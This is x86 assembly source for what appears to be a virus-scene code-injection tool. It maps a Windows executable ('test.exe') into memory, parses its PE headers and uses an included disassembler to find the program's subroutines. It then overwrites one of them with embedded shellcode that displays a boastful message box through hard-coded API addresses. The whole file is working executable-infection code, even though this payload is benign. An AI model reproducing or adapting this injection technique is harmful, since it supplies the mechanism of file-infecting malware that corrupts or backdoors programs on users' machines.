.586p 
.model flat, stdcall
locals
jumps

include              ..\include\shitheap.inc
include              ..\include\win32api.inc
include              ..\include\pe.inc
include              ..\include\mz.inc
include              ..\include\useful.inc

DIZZY_STRUCT         STRUCT
       dizzy_start          dd     ?
       dizzy_end            dd     ?
DIZZY_STRUCT         ENDS

.data
fd                   dd            ?
temp                 dd            ?
memptr               dd            ?
dizzyptr             dd            ?
file                 db            "test.exe", 0


shell                db            0E8h,007h,000h,000h,000h,075h,073h,065h
                     db            072h,033h,032h,000h,0B8h,061h,0D9h,0E7h
                     db            077h,0FFh,0D0h,0E8h,011h,000h,000h,000h
                     db            064h,065h,072h,06Fh,06Bh,06Fh,020h,069h
                     db            073h,020h,064h,061h,020h,06Dh,061h,06Eh
                     db            000h,05Bh,033h,0C0h,050h,053h,053h,050h
                     db            0B8h,076h,064h,0D6h,077h,0FFh,0D0h,050h
                     db            0B8h,0FDh,098h,0E7h,077h,0FFh,0D0h
shellsize            dd            $-shell

.code
__start:
                     push          0
                     push          0
                     push          OPEN_EXISTING
                     push          0
                     push          0
                     push          GENERIC_READ+GENERIC_WRITE                                           
                     push          offset file
                     callW         CreateFileA
                     inc           eax
                     jz            __exit
                     dec           eax
                     mov           fd, eax
                     
                     push          0
                     push          0
                     push          0
                     push          PAGE_READWRITE
                     push          0
                     push          fd
                     callW         CreateFileMappingA
                     test          eax, eax
                     jz            __exit
                     mov           temp, eax
                     
                     push          0
                     push          0
                     push          0
                     push          FILE_MAP_ALL_ACCESS	
                     push          temp
                     callW         MapViewOfFile
                     test          eax, eax
                     jz            __exit
                     mov           memptr, eax
                     
                                          push          PAGE_READWRITE
                     push          MEM_COMMIT
                     push          1000h
                     push          0
                     push          -1
                     callW         VirtualAllocEx                   
                     test          eax, eax
                     jz            __cleanup
                     mov           dizzyptr, eax
                     
                     mov           ebx, memptr
                     add           ebx, [ebx.MZ_lfanew]
                     
                     ;ebx          pointer to IMAGE_NT_HEADERS
                     movzx         ecx, [ebx.NT_FileHeader.FH_NumberOfSections]
                     mov           edx, ebx
                     add           edx, size IMAGE_NT_HEADERS
                     mov           esi, [ebx.NT_OptionalHeader.OH_AddressOfEntryPoint]
__spin_ep:           cmp           esi, [edx.SH_VirtualAddress]
                     jb            __next                     
                     mov           edi, [edx.SH_VirtualAddress]
                     add           edi, [edx.SH_VirtualSize]
                     cmp           esi, edi
                     jb            __ep_o_yeah
__next:              add           edx, size IMAGE_SECTION_HEADER
                     loop          __spin_ep
__ep_o_yeah:         
                     sub           esi, [edx.SH_VirtualAddress]
                     add           esi, [edx.SH_PointerToRawData]
                     add           esi, memptr
                     
                     mov           edx, [ebx.NT_OptionalHeader.OH_SizeOfImage]
                     add           edx, memptr
                     
                     ;find all subs
                     push          edx
                     push          dizzyptr
                     push          esi
                     push          dizzyptr
                     call          dizzy

;inject into 5th subroutine                     
                     mov           edi, dizzyptr
                     mov           ecx, 10
__spin_dizzy:        
                     cmp           ecx, 0
                     jne           __dec_ecx
                     cmp           [edi.dizzy_start], 0
                     je            __cleanup
                     mov           edx, [edi.dizzy_end]
                     sub           edx, [edi.dizzy_start]
                     cmp           edx, shellsize
                     jb            __dizzy_next
                     mov           edi, [edi.dizzy_start]
                     mov           esi, offset shell
                     mov           ecx, shellsize
                     cld
                     rep           movsb
                     jmp           __cleanup
__dec_ecx:           dec           ecx
__dizzy_next:        add           edi, size DIZZY_STRUCT
                     jmp           __spin_dizzy
                    
__cleanup:           push          memptr
                     callW         UnmapViewOfFile
                     push          temp
                     callW         CloseHandle
                     push          fd
                     callW         CloseHandle                                         
__exit:              push          0
                     callW         ExitProcess

include              dizzy32bin.inc
end                  __start